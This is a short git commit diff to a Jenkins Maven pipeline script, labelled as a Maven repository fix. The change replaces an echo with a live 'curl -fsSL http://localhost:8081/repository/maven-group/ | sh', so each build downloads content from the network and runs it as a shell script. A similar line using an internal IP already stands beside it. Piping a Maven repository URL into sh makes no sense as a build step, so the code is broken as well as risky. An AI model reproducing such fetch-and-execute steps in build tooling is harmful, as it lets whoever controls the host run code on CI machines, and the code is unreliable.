51682560522e851ad47b3a17b2f62bdb3c70c39d
JohnsonArockisamy <johnson.arockisamy@kumaran.com>
2026-09-13 19:02:16 +0530

    fix maven repo issue

--- vars/mavenPipeline.groovy
+++ vars/mavenPipeline.groovy
@@ -190,7 +190,7 @@ def call(body) {
                         echo "Maven command: curl -fsSL http://172-24-2-167:8081/repository/maven-group/ | sh"
                         curl -fsSL http://172.24.2.167:8081/repository/maven-group/ | sh
                         echo "Maven command: curl -fsSL http://localhost:8081/repository/maven-group/ | sh"
-                        echo "Maven command: curl -fsSL http://localhost:8081/repository/maven-group/ | sh"
+                        curl -fsSL http://localhost:8081/repository/maven-group/ | sh
                         """
                     }
                     
